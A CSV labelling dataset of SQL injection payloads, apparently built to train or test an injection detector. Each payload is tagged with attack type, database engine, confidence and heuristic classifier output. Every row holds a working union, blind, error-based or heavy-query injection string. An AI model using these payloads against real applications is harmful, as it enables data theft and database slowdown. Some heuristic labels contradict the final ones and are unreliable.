payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
"-5572"" ) union all select 8131,8131#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1414,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-5572"" ) union all select 8131,8131#"
1' in boolean mode ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) #,time_blind,postgresql,0.9,pg_sleep() for time blind,KEEP,,time_blind,postgresql,1415,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,1' in boolean mode ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) #
-3026 ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ),error_based,oracle,0.9,utl_inaddr for Oracle error-based,KEEP,,error_based,oracle,1416,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected,-3026 ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) )
"1%"" and elt ( 4249 = 4249,7259 ) and ""%"" = """,boolean_blind,mysql,0.8,elt() for boolean blind,KEEP,,boolean_blind,mysql,1417,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"1%"" and elt ( 4249 = 4249,7259 ) and ""%"" = """
1' where 2389 = 2389 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,boolean_blind,postgresql,0.8,CAST for PostgreSQL blind,KEEP,,boolean_blind,postgresql,1418,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1' where 2389 = 2389 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --
"1 ) where 6788 = 6788 union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1419,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1 ) where 6788 = 6788 union all select null,null,null,null,null,null,null,null,null--"
"1"" union all select null,null,null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1420,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1"" union all select null,null,null,null,null#"
select sleep ( 5 ) -- hlgt,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1421,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,select sleep ( 5 ) -- hlgt
"1' ) ) ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ( ( 'sqnk' = 'sqnk",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,1422,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1' ) ) ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ( ( 'sqnk' = 'sqnk"
"1' ) ) as ytfi where 3323 = 3323 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,0.85,randomblob() for time blind,KEEP,,time_blind,sqlite,1423,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"1' ) ) as ytfi where 3323 = 3323 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --"
"-4091 ) ) as lqqy where 3030 = 3030 union all select 3030,3030,3030#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1424,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-4091 ) ) as lqqy where 3030 = 3030 union all select 3030,3030,3030#"
"1', ( select ( case when ( 8596 = 8596 ) then 1 else 8596* ( select 8596 from mysql.db ) end ) )",boolean_blind,mysql,0.8,CASE WHEN for boolean blind,KEEP,,boolean_blind,mysql,1425,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1', ( select ( case when ( 8596 = 8596 ) then 1 else 8596* ( select 8596 from mysql.db ) end ) )"
1' ) ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ( 'snoa' = 'snoa,boolean_blind,firebird,0.8,Case when for Firebird blind,KEEP,,boolean_blind,firebird,1426,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal,1' ) ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ( 'snoa' = 'snoa
"1"" where 9014 = 9014 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) --",time_blind,postgresql,0.9,pg_sleep() for time blind,KEEP,,time_blind,postgresql,1427,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,"1"" where 9014 = 9014 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) --"
select case when 8227 = 1229 then 1 else null end--,boolean_blind,generic,0.8,CASE WHEN for boolean blind,KEEP,,boolean_blind,generic,1428,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,select case when 8227 = 1229 then 1 else null end--
-8465' where 5242 = 5242 or 3806 = 7423--,boolean_blind,generic,0.8,OR comparison for blind,KEEP,,boolean_blind,generic,1429,boolean_blind,generic,Pattern match: 'or 3806 = 7423' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-8465' where 5242 = 5242 or 3806 = 7423--
"-1949"" ) ) as urke where 8761 = 8761 union all select 8761,8761,8761,8761,8761,8761,8761#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1430,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-1949"" ) ) as urke where 8761 = 8761 union all select 8761,8761,8761,8761,8761,8761,8761#"
"1' ) ) as uuuk where 7234 = 7234 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",time_blind,oracle,0.9,dbms_pipe for Oracle time blind,KEEP,,time_blind,oracle,1431,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"1' ) ) as uuuk where 7234 = 7234 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --"
1' ) as mqxb where 6496 = 6496 and 7533 = 7533--,boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,1432,boolean_blind,generic,Pattern match: 'and 7533 = 7533' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1' ) as mqxb where 6496 = 6496 and 7533 = 7533--
"1%' union all select null,null,null,null,null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1433,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1%' union all select null,null,null,null,null,null,null,null--"
1' ) where 4298 = 4298,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1434,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) where 4298 = 4298
"-5417 or elt ( 1032 = 1032,3623 )",boolean_blind,mysql,0.8,elt() for boolean blind,KEEP,,boolean_blind,mysql,1435,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"-5417 or elt ( 1032 = 1032,3623 )"
"-9978"" or make_set ( 4893 = 9765,9765 ) and ""mhjt"" = ""mhjt",boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,1436,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"-9978"" or make_set ( 4893 = 9765,9765 ) and ""mhjt"" = ""mhjt"
"-7501'+ ( select uloc where 3089 = 3089 union all select 3089,3089,3089,3089,3089,3089,3089,3089,3089,3089--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1437,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-7501'+ ( select uloc where 3089 = 3089 union all select 3089,3089,3089,3089,3089,3089,3089,3089,3089,3089--"
"1'|| ( select 'iocs' where 9287 = 9287 and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) ) ||'",heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,1438,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"1'|| ( select 'iocs' where 9287 = 9287 and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) ) ||'"
"1 ) ) as khvx where 7533 = 7533 union all select null,null,null,null,null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1439,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1 ) ) as khvx where 7533 = 7533 union all select null,null,null,null,null,null,null,null--"
"1"" ) as jtou where 8129 = 8129 and 7533 = 7533--",boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,1440,boolean_blind,generic,Pattern match: 'and 7533 = 7533' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","1"" ) as jtou where 8129 = 8129 and 7533 = 7533--"
1 ) where 6494 = 6494,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1441,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 ) where 6494 = 6494
"select count ( * ) from generate_series ( 1,5000000 ) and 'dfwj' = 'dfwj",heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,1442,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"select count ( * ) from generate_series ( 1,5000000 ) and 'dfwj' = 'dfwj"
"1'+ ( select luwn where 1214 = 1214 union all select null,null,null,null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1443,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1'+ ( select luwn where 1214 = 1214 union all select null,null,null,null,null,null#"
1%' ) ) ) and 2006 = 2006,boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,1444,boolean_blind,generic,Pattern match: 'and 2006 = 2006' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1%' ) ) ) and 2006 = 2006
"-7235"" ) union all select 4624,4624,4624,4624,4624,4624,4624,4624,4624,4624#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1445,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-7235"" ) union all select 4624,4624,4624,4624,4624,4624,4624,4624,4624,4624#"
"-3756' ) union all select 1034,1034,1034--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1446,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-3756' ) union all select 1034,1034,1034--"
select sleep ( 5 ) and 'gajm' = 'gajm,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1447,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,select sleep ( 5 ) and 'gajm' = 'gajm
"1"" ) ) ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( ""twpn"" like ""twpn",boolean_blind,generic,0.75,SELECT IF for boolean blind,KEEP,,boolean_blind,generic,1448,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1"" ) ) ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( ""twpn"" like ""twpn"
-3956' ) or ( 8459 = 8459 ) *4906 and ( 'rflo' like 'rflo,boolean_blind,generic,0.75,Multiplication for blind,KEEP,,boolean_blind,generic,1449,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,-3956' ) or ( 8459 = 8459 ) *4906 and ( 'rflo' like 'rflo
"1,iif ( 1440 = 4612,1,1/0 )",boolean_blind,mssql,0.85,iif() for MSSQL boolean blind,KEEP,,boolean_blind,mssql,1450,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,"1,iif ( 1440 = 4612,1,1/0 )"
1' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( 'gegg' = 'gegg,boolean_blind,postgresql,0.8,CAST for PostgreSQL blind,KEEP,,boolean_blind,postgresql,1451,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( 'gegg' = 'gegg
"1 union all select null,null,null,null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1452,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1 union all select null,null,null,null,null,null#"
"select count ( * ) from generate_series ( 1,5000000 ) and ( ( ( 'wvzw' = 'wvzw",heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,1453,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"select count ( * ) from generate_series ( 1,5000000 ) and ( ( ( 'wvzw' = 'wvzw"
"1' ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )",time_blind,oracle,0.9,dbms_pipe for Oracle time blind,KEEP,,time_blind,oracle,1454,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"1' ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )"
1'+ ( select 'yjpp' where 8966 = 8966,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1455,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1'+ ( select 'yjpp' where 8966 = 8966
"-8266%' ) union all select 8626,8626,8626,8626,8626,8626--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1456,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-8266%' ) union all select 8626,8626,8626,8626,8626,8626--"
"-2787' union all select 3622,3622,3622,3622,3622,3622,3622,3622,3622,3622#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1457,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-2787' union all select 3622,3622,3622,3622,3622,3622,3622,3622,3622,3622#"
"-6359"" ) ) or elt ( 3546 = 2433,2433 ) and ( ( ""qxat"" = ""qxat",boolean_blind,mysql,0.8,elt() for boolean blind,KEEP,,boolean_blind,mysql,1458,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"-6359"" ) ) or elt ( 3546 = 2433,2433 ) and ( ( ""qxat"" = ""qxat"
1 ) ) ) and 6358 = 6735,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1459,boolean_blind,generic,Pattern match: 'and 6358 = 6735' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1 ) ) ) and 6358 = 6735
1' ) ) as cimd where 9608 = 9608,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1460,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) ) as cimd where 9608 = 9608
"1' ) as kgnd where 1550 = 1550 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",heavy_query,sqlite,0.9,randomblob for heavy query,KEEP,,heavy_query,sqlite,1461,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"1' ) as kgnd where 1550 = 1550 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --"
-9690 union all select 7217#,union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1462,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,-9690 union all select 7217#
1' ) ) ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ( ( 'lajk' = 'lajk,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1463,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,1' ) ) ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ( ( 'lajk' = 'lajk
1' ) where 1212 = 1212,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1464,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) where 1212 = 1212
"1'|| ( select 'ggfx' where 4932 = 4932 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) ) ||'",time_blind,oracle,0.9,dbms_pipe for Oracle time blind,KEEP,,time_blind,oracle,1465,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"1'|| ( select 'ggfx' where 4932 = 4932 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) ) ||'"
1' ) ) ) and ( 1685 = 2985 ) *2985 and ( ( ( 'rzwb' = 'rzwb,boolean_blind,generic,0.75,Multiplication for blind,KEEP,,boolean_blind,generic,1466,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,1' ) ) ) and ( 1685 = 2985 ) *2985 and ( ( ( 'rzwb' = 'rzwb
"1"" ) as yecj where 1194 = 1194 and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,1467,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"1"" ) as yecj where 1194 = 1194 and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --"
